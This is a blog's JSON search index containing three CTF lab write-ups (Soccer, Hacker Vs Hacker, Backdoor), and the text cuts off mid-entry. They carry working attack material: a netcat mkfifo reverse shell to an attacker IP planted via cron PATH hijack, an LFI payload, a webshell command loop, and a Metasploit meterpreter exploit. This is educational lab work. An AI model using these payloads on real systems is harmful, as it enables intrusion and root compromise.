[ { "title": "HackTheBox Soccer Writeup", "url": "/posts/Soccer/", "categories": "htb", "tags": "htb, sqli, websockets, dstat, doas", "date": "2023-06-18 00:00:00 +0530", "snippet": "Soccer - Easy (Hackthebox)Port scan resultsPORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 ad:0d:84:a3:fd:cc:98:a4:78:fe:f9:49:15:da:e1:6d (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChXu/2AxokRA9pcTIQx6HKyiO0odku5KmUpklDRNG+9sa6olMd4dSBq1d0rGtsO2rNJRLQUczml6+N5DcCasAZUShDrMnitsRvG54x8GrJyW4nIx4HOfXRTsNqImBadIJtvIww1L7H1DPzMZYJZj/oOwQHXvp85a2hMqMmoqsljtS/jO3tk7NUKA/8D5KuekSmw8m1pPEGybAZxlAYGu3KbasN66jmhf0ReHg3Vjx9e8FbHr3ksc/MimSMfRq0lIo5fJ7QAnbttM5ktuQqzvVjJmZ0+aL7ZeVewTXLmtkOxX9E5ldihtUFj8C6cQroX69LaaN/AXoEZWl/v1LWE5Qo1DEPrv7A6mIVZvWIM8/AqLpP8JWgAQevOtby5mpmhSxYXUgyii5xRAnvDWwkbwxhKcBIzVy4x5TXinVR7FrrwvKmNAG2t4lpDgmryBZ0YSgxgSAcHIBOglugehGZRHJC9C273hs44EToGCrHBY8n2flJe7OgbjEL8Il3SpfUEF0=| 256 df:d6:a3:9f:68:26:9d:fc:7c:6a:0c:29:e9:61:f0:0c (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIy3gWUPD+EqFcmc0ngWeRLfCr68+uiuM59j9zrtLNRcLJSTJmlHUdcq25/esgeZkyQ0mr2RZ5gozpBd5yzpdzk=| 256 57:97:56:5d:ef:79:3c:2f:cb:db:35:ff:f1:7c:61:5c (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ2Pj1mZ0q8u/E8K49Gezm3jguM3d8VyAYsX0QyaN6H/80/tcp open http syn-ack nginx 1.18.0 (Ubuntu)|_http-server-header: nginx/1.18.0 (Ubuntu)| http-methods:|_ Supported Methods: GET HEAD|_http-title: Soccer - Index9091/tcp open xmltec-xmlmail? syn-ack| fingerprint-strings:| DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, RPCCheck, SSLSessionReq, drda, informix:| HTTP/1.1 400 Bad Request| Connection: close| GetRequest:| HTTP/1.1 404 Not Found| Content-Security-Policy: default-src &#39;none&#39;| X-Content-Type-Options: nosniff| Content-Type: text/html; charset=utf-8| Content-Length: 139| Date: Sun, 18 Jun 2023 10:23:57 GMT| Connection: close| &amp;lt;!DOCTYPE html&amp;gt;| &amp;lt;html lang=&quot;en&quot;&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;| &amp;lt;title&amp;gt;Error&amp;lt;/title&amp;gt;| &amp;lt;/head&amp;gt;| &amp;lt;body&amp;gt;| &amp;lt;pre&amp;gt;Cannot GET /&amp;lt;/pre&amp;gt;| &amp;lt;/body&amp;gt;| &amp;lt;/html&amp;gt;| HTTPOptions:| HTTP/1.1 404 Not Found| Content-Security-Policy: default-src &#39;none&#39;| X-Content-Type-Options: nosniff| Content-Type: text/html; charset=utf-8| Content-Length: 143| Date: Sun, 18 Jun 2023 10:23:57 GMT| Connection: close| &amp;lt;!DOCTYPE html&amp;gt;| &amp;lt;html lang=&quot;en&quot;&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;| &amp;lt;title&amp;gt;Error&amp;lt;/title&amp;gt;| &amp;lt;/head&amp;gt;| &amp;lt;body&amp;gt;| &amp;lt;pre&amp;gt;Cannot OPTIONS /&amp;lt;/pre&amp;gt;| &amp;lt;/body&amp;gt;| &amp;lt;/html&amp;gt;| RTSPRequest:| HTTP/1.1 404 Not Found| Content-Security-Policy: default-src &#39;none&#39;| X-Content-Type-Options: nosniff| Content-Type: text/html; charset=utf-8| Content-Length: 143| Date: Sun, 18 Jun 2023 10:23:58 GMT| Connection: close| &amp;lt;!DOCTYPE html&amp;gt;| &amp;lt;html lang=&quot;en&quot;&amp;gt;| &amp;lt;head&amp;gt;| &amp;lt;meta charset=&quot;utf-8&quot;&amp;gt;| &amp;lt;title&amp;gt;Error&amp;lt;/title&amp;gt;| &amp;lt;/head&amp;gt;| &amp;lt;body&amp;gt;| &amp;lt;pre&amp;gt;Cannot OPTIONS /&amp;lt;/pre&amp;gt;| &amp;lt;/body&amp;gt;|_ &amp;lt;/html&amp;gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port9091-TCP:V=7.94%I=7%D=6/18%Time=648EDB37%P=x86_64-pc-linux-gnu%r(inSF:formix,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\rSF:\\n\\r\\n&quot;)%r(drda,2F,&quot;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\xSF:20close\\r\\n\\r\\n&quot;)%r(GetRequest,168,&quot;HTTP/1\\.1\\x20404\\x20Not\\x20Found\\r\\SF:nContent-Security-Policy:\\x20default-src\\x20&#39;none&#39;\\r\\nX-Content-Type-Op&amp;lt;-- REDACTED --&amp;gt;SF:20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\n\\r\\n&quot;);Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelDirectory scan$ gobuster dir -u http://soccer.htb/ -w /usr/share/wordlist/Discovery/Web-Content/big.txt===============================================================Gobuster v3.5by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://soccer.htb/[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlist/Discovery/Web-Content/big.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.5[+] Timeout: 10s===============================================================2023/06/18 16:12:32 Starting gobuster in directory enumeration mode===============================================================/.htaccess (Status: 403) [Size: 162]/.htpasswd (Status: 403) [Size: 162]/tiny (Status: 301) [Size: 178] [--&amp;gt; http://soccer.htb/tiny/]Progress: 20456 / 20477 (99.90%)===============================================================2023/06/18 16:19:07 Finished===============================================================/tiny Found a web hosted file manager h3k file manager (Github) - https://github.com/prasathmani/tinyfilemanager Found default credentials - admin:admin@123 Shell Homepage Uploading a php revshell script into /tiny/uploads/ Revshell : https://github.com/pentestmonkey/php-reverse-shell And we got the shellnew subdomainwww-data@soccer:/etc/nginx/sites-enabled$ lsdefault soc-player.htbwww-data@soccer:/etc/nginx/sites-enabled$ cat soc-player.htbserver { listen 80; listen [::]:80; server_name soc-player.soccer.htb; root /root/app/views; location / { proxy_pass http://localhost:3000; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &#39;upgrade&#39;; proxy_set_header Host $host; proxy_cache_bypass $http_upgrade; }}www-data@soccer:/etc/nginx/sites-enabled$ Adding soc-player.soccer.htb in our hosts fileExploiting web sockets with sqlmap Create a account here : http://soc-player.soccer.htb/signup After the login the homepage contains a field where tickets are checked if exists or not It is vulnerable to SQLi, payload : 1234 OR 1=1SQLmap: Payload : ` sqlmap -u ‘ws://soc-player.soccer.htb:9091/’ –data ‘{“id”:”*”}’ –batch –level 5 –risk 3 –dbs –threads 10` Breadkdown : sqlmap : tool we used to automate exploitation of sql injection -u &#39;ws://soc-player.soccer.htb:9091/&#39; : here we set url with -u --data &#39;{&quot;id&quot;:&quot;*&quot;}&#39; : data that we going to use/ data that websockets is using, the * specifies sqlmap to insert all of it’s payload there. --batch : to automate Y/N, if we don’t ues this then we have an interactive session with sqlmap. --level : to set the level of how aggressive our attack should be (1 is low, 5 is the highest) --risk : to set the risk of the attack (1 is the lowest, 3 is the highest) --dbs : to get databases from the server --threads : to increase the speed of the attack FINAL PAYLOAD : sqlmap -u &#39;ws://soc-player.soccer.htb:9091/&#39; --data &#39;{&quot;id&quot;:&quot;*&quot;}&#39; --batch --level 5 --risk 3 --dump -T &amp;lt;--REDACTED--&amp;gt; -D &amp;lt;--REDACTED--&amp;gt; --threads 10 We got credentials for account player+------+-------------------+----------+----------------------+| id | email | username | password |+------+-------------------+----------+----------------------+| 1324 | player@player.htb | player | &amp;lt;--REDACTED--&amp;gt; |+------+-------------------+----------+----------------------+User shellRoot Shell Follow the steps here : https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/sudo/sudo-dstat-privilege-escalation/#exploitation——— PWNED ———-" }, { "title": "Tryhackme Hacker Vs Hacker writeup", "url": "/posts/HackerVSHacker/", "categories": "thm", "tags": "thm", "date": "2022-08-16 01:30:00 +0530", "snippet": "Machine : Hacker Vs. HackerWriteup status: Completed.EnumerationPort Scan Rustscan results└─[$] rustscan -t 2000 -a 10.10.33.194 -- -sC -sV -----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39;The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------0day was here ♥[~] The config file is expected to be at &quot;/home/dragon/.rustscan.toml&quot;[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers[!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.10.33.194:22Open 10.10.33.194:80[~] Starting Script(s)[&amp;gt;] Running script &quot;nmap -vvv -p -sC -sV&quot; on ip 10.10.33.194Depending on the complexity of the script, results may take some time to appear.[~] Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-16 15:36 IST&amp;lt;&amp;lt;--SNIP--&amp;gt;&amp;gt;PORT STATE SERVICE REASON VERSION22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 9f:a6:01:53:92:3a:1d:ba:d7:18:18:5c:0d:8e:92:2c (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDEwViZRbXUs9kag3j00D1FtRrtg3PKTSXGdTaJC14E+FWVLUKxlCTbI89GtFCqL22nDVi3nmG5QQDxEfl4zTOIgZXi4FXst0ZfzMayH8T+t9jSc2OlCuIyZYyw+JDP2G+WJXHC67BSthXTt9eMeDPxi7r03GA0nqMSFJ8lw5FqTnzyacLne5ojiB/atnHpVXa0DoSmT+w8t1Pk3nhnk0zrlOxVOfkx8Jze8NHynP4BFr/Ea3PNvvmJ2hpRUgO3IGVQ3bt55ab3ZoFy344Fy5ISsYXYQJBeLUhu2GVeCihzgUFkecKZEUhnc0S8Idy5EnDWeEaRQjE832gKvUJ9d0PIEN8sTxgSEp1RcijMm8/2vEWzeRVAKaHCaU8lV/jbtyl6s5jgkStuy6NwqpWf24D0TydU5jwsjGTLWJbrDNsYbP28qas0o2+zwmzqwaOJMwuk0CYVZCcd2qGVRRxYu6NhfIudRPMLPp/EvhfEUPoYR6tmX42pvpqNH70kotCiQiM=| 256 4b:60:dc:fb:92:a8:6f:fc:74:53:64:c1:8c:bd:de:7c (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMZXOzdGFYNrQPBrILKG3Zd+DlWWE133ONnKOGm3MhuTgWZjEkYI1g5pn6ggVCnJwZHgvkvjSudcCImNk92yW7g=| 256 83:d4:9c:d0:90:36:ce:83:f7:c7:53:30:28:df:c3:d5 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEznWyrDbdSTIAxhoKlcRP8mZ/LX/wQSAvofU1MLracp80/tcp open http syn-ack Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-favicon: Unknown favicon MD5: DD1493059959BA895A46C026C39C36EF| http-methods: |_ Supported Methods: GET POST OPTIONS HEAD|_http-title: RecruitSec: Industry Leading Infosec RecruitmentService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel&amp;lt;&amp;lt;--SNIP--&amp;gt;&amp;gt;ead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 19.48 seconds There are 2 ports open 22 and 80HomepageDirectory Scanning&amp;lt;Del&amp;gt;└─[$] ffuf -u http://10.10.33.194/FUZZ -w ~/wordlists/directory/directory-list-2.3-medium.txt [15:46:18] /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.5.0-dev________________________________________________ :: Method : GET :: URL : http://10.10.33.194/FUZZ :: Wordlist : FUZZ: /home/dragon/wordlists/directory/directory-list-2.3-medium.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405,500________________________________________________images [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 171ms]css [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 139ms]cvs [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 138ms]dist [Status: 301, Size: 311, Words: 20, Lines: 10, Duration: 139ms]server-status [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 158ms]:: Progress: [220560/220560] :: Job [1/1] :: 249 req/sec :: Duration: [0:17:29] :: Errors: 0 :: Seeing all those directory nothing found to be useful After uploading a pdf file in the upload section we can see the source code in intercepted request HTTP/1.1 200 OKDate: Tue, 16 Aug 2022 10:55:12 GMTServer: Apache/2.4.41 (Ubuntu)Vary: Accept-EncodingContent-Length: 552Connection: closeContent-Type: text/html; charset=UTF-8Hacked! If you dont want me to upload my shell, do better at filtering!&amp;lt;!-- seriously, dumb stuff:$target_dir = &quot;cvs/&quot;;$target_file = $target_dir . basename($_FILES[&quot;fileToUpload&quot;][&quot;name&quot;]);if (!strpos($target_file, &quot;.pdf&quot;)) { echo &quot;Only PDF CVs are accepted.&quot;;} else if (file_exists($target_file)) { echo &quot;This CV has already been uploaded!&quot;;} else if (move_uploaded_file($_FILES[&quot;fileToUpload&quot;][&quot;tmp_name&quot;], $target_file)) { echo &quot;Success! We will get back to you.&quot;;} else { echo &quot;Something went wrong :|&quot;;}--&amp;gt; I tried to upload a pdf file but it returned the same response which made me think that the hacker must have used the same technique to bypass the filteration and got the shell onto the servers, which means that the hacker has a shell/payload on the server which we can use and get a shell. As the server uses PHP and we saw the source code as well, the upload program uses strpos() so, as long the filename has .php in it we are good to go. I fuzzed the /cvs with guessing the extension .pdf.php gobuster results └─[$] gobuster dir -u http://10.10.117.45/cvs/ -w ~/wordlists/directory/directory-list-2.3-small.txt -x .pdf.php -t 50 ===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp;amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.117.45/cvs/[+] Method: GET[+] Threads: 50[+] Wordlist: /home/dragon/wordlists/directory/directory-list-2.3-small.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Extensions: pdf.php[+] Timeout: 10s===============================================================2022/08/16 16:55:10 Starting gobuster in directory enumeration mode===============================================================/shell.pdf.php (Status: 200) [Size: 18]Progress: 12400 / 175330 (7.07%) Progress: 12442 / 175330 (7.10%) ^C[!] Keyboard interrupt detected, terminating. =============================================================== shell.pdf.php seems intresting,└─[$] curl 10.10.117.45/cvs/shell.pdf.php &amp;lt;pre&amp;gt;&amp;lt;/pre&amp;gt;boom!% Just as I expected, this php file was used by the hackers to get shell on the servers. After trying for a while, i fount it uses cmd as it’s parameter └─[$] curl http://10.10.117.45/cvs/shell.pdf.php\\?cmd\\=id &amp;lt;pre&amp;gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&amp;lt;/pre&amp;gt;boom!% Voila we can now execute commands and get the user shell After trying to get revshell everytime the server send nope after we got a shell └─[$] nc -nvlp 9001 Connection from 10.10.117.45:52160$ whoaminoperead(net): Connection reset by peer└─[$] nc -nvlp 9001 Connection from 10.10.117.45:52162$ lsnope I developed a custom py exploit for temp shell till we get the user shell.import requestsurl = &#39;http://10.10.117.45/cvs/shell.pdf.php/?cmd=&#39;cmd = &#39;&#39;while(cmd != &#39;exit&#39;): cmd = input(&#39;command&amp;gt;&#39;) r = requests.get(url + cmd) print(r.text[5:-14], &#39;\\n&#39;) After searching for a while i found lachlan&#39;s password in the .bash_history but unfortunately it gave same response nope.command&amp;gt;cat /home/lachlan/.bash_history./cve.sh./cve-patch.shvi /etc/cron.d/persistenceecho -e &quot;dHY5pzmNYoETv7SUaY\\nthisistheway123\\nthisistheway123&quot; | passwdls -sf /dev/null /home/lachlan/.bash_history Trying to ssh└─[$] ssh lachlan@10.10.117.45 The authenticity of host &#39;10.10.117.45 (10.10.117.45)&#39; can&#39;t be established.ED25519 key fingerprint is SHA256:2RN2fsvo4NewQ4PV/D/U+gbDQND2ckUUnofzShfqqJk.This key is not known by any other namesAre you sure you want to continue connecting (yes/no/[fingerprint])? yesWarning: Permanently added &#39;10.10.117.45&#39; (ED25519) to the list of known hosts.lachlan@10.10.117.45&#39;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 16 Aug 2022 11:57:49 AM UTC System load: 0.24 Processes: 121 Usage of /: 25.6% of 9.78GB Users logged in: 0 Memory usage: 52% IPv4 address for eth0: 10.10.117.45 Swap usage: 0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateLast login: Thu May 5 04:39:19 2022 from 192.168.56.1$ nopeConnection to 10.10.117.45 closed. let’s check out the file hackers might have edited that we noticed in the .bash_historycommand&amp;gt;cat /etc/cron.d/persistencePATH=/home/lachlan/bin:/bin:/usr/bin# * * * * * root backup.sh* * * * * root /bin/sleep 1 &amp;amp;&amp;amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope &amp;gt; /dev/pts/$f &amp;amp;&amp;amp; pkill -9 -t pts/$f; done* * * * * root /bin/sleep 11 &amp;amp;&amp;amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope &amp;gt; /dev/pts/$f &amp;amp;&amp;amp; pkill -9 -t pts/$f; done* * * * * root /bin/sleep 21 &amp;amp;&amp;amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope &amp;gt; /dev/pts/$f &amp;amp;&amp;amp; pkill -9 -t pts/$f; done* * * * * root /bin/sleep 31 &amp;amp;&amp;amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope &amp;gt; /dev/pts/$f &amp;amp;&amp;amp; pkill -9 -t pts/$f; done* * * * * root /bin/sleep 41 &amp;amp;&amp;amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope &amp;gt; /dev/pts/$f &amp;amp;&amp;amp; pkill -9 -t pts/$f; done* * * * * root /bin/sleep 51 &amp;amp;&amp;amp; for f in `/bin/ls /dev/pts`; do /usr/bin/echo nope &amp;gt; /dev/pts/$f &amp;amp;&amp;amp; pkill -9 -t pts/$f; done As you can see the cronjob runs after every 10 seconds and echo’s nope in /dev/pts what is /dev/pts? Consider as this file contains data of the current terminal For better understanding you can type tty in your current shell and type echo hello &amp;gt; /dev/pts/&amp;lt;shell_no&amp;gt; in a new shell and you can see the hello on your current shell. Hmmmm, what next? Now as we can see the $PATH variable is declared inside the cron file… PATH=/home/lachlan/bin:/bin:/usr/bin So first the binaries will checkout in /home/lachlan/bin then /bin followed by /usr/binUser Shell As all the binary in the cronjob use absolute paht pkill is using relative path, that means if we create a binary named pkill in our home directory we can bypass it’s effects. Editing the pkill will get us a stable shell. └─[$] ssh lachlan@10.10.19.188 &#39;echo &quot;hi&quot; &amp;gt; ./bin/pkill &amp;amp;&amp;amp; chmod +x ./bin/pkill&#39; lachlan@10.10.19.188&#39;s password: We can check if the file is created or not with out temp shell└─[$] python3 tempShell.pycommand&amp;gt;ls -la /home/lachlan/bintotal 16drwxr-xr-x 2 lachlan lachlan 4096 Aug 16 13:56 .drwxr-xr-x 4 lachlan lachlan 4096 May 5 04:39 ..-rw-r--r-- 1 lachlan lachlan 56 May 5 04:38 backup.sh-rwxrwxr-x 1 lachlan lachlan 3 Aug 16 13:58 pkill command&amp;gt;cat /home/lachlan/bin/pkillhi As we can see we have successfully edited the pkill Lets try for the shell└─[$] ssh lachlan@10.10.19.188 lachlan@10.10.19.188&#39;s password: Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage System information as of Tue 16 Aug 2022 02:01:14 PM UTC System load: 0.29 Processes: 126 Usage of /: 25.0% of 9.78GB Users logged in: 0 Memory usage: 48% IPv4 address for eth0: 10.10.19.188 Swap usage: 0%0 updates can be applied immediately.The list of available updates is more than a week old.To check for new updates run: sudo apt updateFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settingsLast login: Thu May 5 04:39:19 2022 from 192.168.56.1$ bashlachlan@b2r:~$ lachlan@b2r:~$ iduid=1001(lachlan) gid=1001(lachlan) groups=1001(lachlan)lachlan@b2r:~$ nopelachlan@b2r:~$ We still have echo nope but we the shell remains.Root shell As the pkill and other cronjob service runs after every 10 seconds with root privileges we can edit ./bin/pkill and get the root shell. Editing and adding revshell payload inside /home/lachlan/bin/pkill rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.8.237.225 4444 &amp;gt;/tmp/f Start the netcat and wait for 10 seconds to get root shell Payloadlachlan@b2r:~/bin$ echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.8.237.225 4444 &amp;gt;/tmp/f&quot; &amp;gt; pkilllachlan@b2r:~/bin$ cat pkill rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&amp;gt;&amp;amp;1|nc 10.8.237.225 4444 &amp;gt;/tmp/fShell We now get root shell on our netcat.└─[$] nc -nvlp 4444 Connection from 10.10.19.188:36670sh: 0: can&#39;t access tty; job control turned off# iduid=0(root) gid=0(root) groups=0(root)# — MACHINE ROOTED —" }, { "title": "Hackthebox Backdoor Writeup", "url": "/posts/Backdoor_htb/", "categories": "htb", "tags": "htb", "date": "2022-04-23 00:00:00 +0530", "snippet": "Machine Name - BackdoorInitial EnumerationNmap Scan└─$ nmap -p- 1337,80,22 backdoor.htb -sC -sVStarting Nmap 7.91 ( https://nmap.org ) at 2021-11-21 15:24 ISTNmap scan report for backdoor.htb (10.129.236.8)Host is up (0.34s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)| 256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)|_ 256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-generator: WordPress 5.8.1|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Backdoor &amp;amp;#8211; Real-Life1337/tcp open waste?Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 27.00 secondsDirectory Listing└─$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://backdoor.htb/wp-content/FUZZ -c ________________________________________________ :: Method : GET :: URL : http://backdoor.htb/wp-content/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10].htaccess [Status: 403, Size: 277, Words: 20, Lines: 10]server-status [Status: 403, Size: 277, Words: 20, Lines: 10]wp-admin [Status: 301, Size: 315, Words: 20, Lines: 10]wp-content [Status: 301, Size: 317, Words: 20, Lines: 10]wp-includes [Status: 301, Size: 318, Words: 20, Lines: 10]:: Progress: [20469/20469] :: Job [1/1] :: 160 req/sec :: Duration: [0:02:14] :: Errors: 0 :: The wp-admin directory lands you to a wordpress login page, I tried cracking the password with rockyou.txt but failed The wp-content directory had nothing, so I further ffuf it go see more directoires in itWp-content└─$ ffuf -w /usr/share/wordlists/dirb/big.txt -u http://backdoor.htb/wp-content/FUZZ -c ________________________________________________ :: Method : GET :: URL : http://backdoor.htb/wp-content/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/dirb/big.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405________________________________________________.htaccess [Status: 403, Size: 277, Words: 20, Lines: 10].htpasswd [Status: 403, Size: 277, Words: 20, Lines: 10]plugins [Status: 301, Size: 325, Words: 20, Lines: 10]themes [Status: 301, Size: 324, Words: 20, Lines: 10]upgrade [Status: 301, Size: 325, Words: 20, Lines: 10]uploads [Status: 301, Size: 325, Words: 20, Lines: 10]:: Progress: [20469/20469] :: Job [1/1] :: 160 req/sec :: Duration: [0:02:14] :: Errors: 0 :: The plugins directory is quiet intresting After messing around on web I found this exploit link : https://www.exploit-db.com/exploits/39575 Payload : http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php Iniital Foothold I tried getting the id_rsa with LFI but the user directory didn’t have any ssh keys The port 1337 had ?waste service which nmap said ( NOTE : ?waste wasn’t the service running on port 1337 ) Let’s check what service that port had I read the man page for proc and found /cmdline intresting which tells sumary about a service Man page of proc : https://man7.org/linux/man-pages/man5/proc.5.html I didn’t found any exploits that shows services , so I made oneCheck Services Exploit.py import requestsurl = &#39;http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=&#39;pl = []start = 900 # The service was on 956 for me, if you didn&#39;t found the service try changing the start pointfor i in range(start,1010): pl.append(f&#39;{url}../../../../../../../../../../../../../../../proc/{i}/cmdline&#39;) for i in pl: r = requests.get(i) check = r.text if &#39;1337&#39; in check: print(check) print(&#39;SERVICE SUCCESSFULLY FOUND&#39;) break else: print(f&#39;trying on /proc/{start}/cmdline&#39;) start+=1 Output.txt../../../../../../../../../../../../../../../proc/956/cmdline../../../../../../../../../../../../../../../proc/956/cmdline../../../../../../../../../../../../../../../proc/956/cmdline/bin/sh -c while true;do su user -c &quot;cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;&quot;; done&amp;lt;script&amp;gt;window.close()&amp;lt;/script&amp;gt; So the port 1337 is running a gdbserver Link : https://www.rapid7.com/db/modules/exploit/multi/gdb/gdb_server_exec/User Shell Use this msf exploit to get the user shell : use exploit/multi/gdb/gdb_server_execmsf6 exploit(multi/gdb/gdb_server_exec) &amp;gt; set lhost 10.10.14.76lhost =&amp;gt; 10.10.14.76msf6 exploit(multi/gdb/gdb_server_exec) &amp;gt; set rhosts &amp;lt;IP OF THE MACHINE&amp;gt;msf6 exploit(multi/gdb/gdb_server_exec) &amp;gt; set target 1target =&amp;gt; 1msf6 exploit(multi/gdb/gdb_server_exec) &amp;gt; set payload linux/x64/meterpreter/reverse_tcppayload =&amp;gt; linux/x64/meterpreter/reverse_tcpmsf6 exploit(multi/gdb/gdb_server_exec) &amp;gt; set rport 1337rport =&amp;gt; 1337 Exploiting it gets us to &amp;lt;meterpreter&amp;gt; , to get a proper shell use shell command And we have the user shell python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;user@Backdoor:~$ ididuid=1000(user) gid=1000(user) groups=1000(user)user@Backdoor:~$ cat user.txt&amp;lt;--SNIPPED--&amp;gt;Privilege EscalationLinpeasroot 937 0.0 0.1 8356 3420 ? S 07:15 0:00 _ /usr/sbin/CRON -froot 954 0.0 0.0 2608 1596 ? Ss 07:15 0:02 _ /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec s The screen service is running at root privilegesRoot Shelluser@Backdoor:~$ /usr/bin/screen -h-h lines Set the size of the scrollback history buffer.-i Interrupt output sooner when flow control is on.-l Login mode on (update /var/run/utmp), -ln = off.-ls [match] or-list Do nothing, just list our SockDir [on possible matches].-L Turn on output logging.-Logfile file Set logfile name.-m ignore $STY variable, do create a new screen session.-O Choose optimal output rather than exact vt100 emulation.-p window Preselect the named window if it exists.-q Quiet startup. Exits with non-zero return code if unsuccessful.-Q Commands will send the response to the stdout of the querying process.-r [session] Reattach to a detached screen process.-R Reattach if possible, otherwise start a new session.-s shell Shell to execute rather than $SHELL.-S sockname Name this session &amp;lt;pid&amp;gt;.sockname instead of 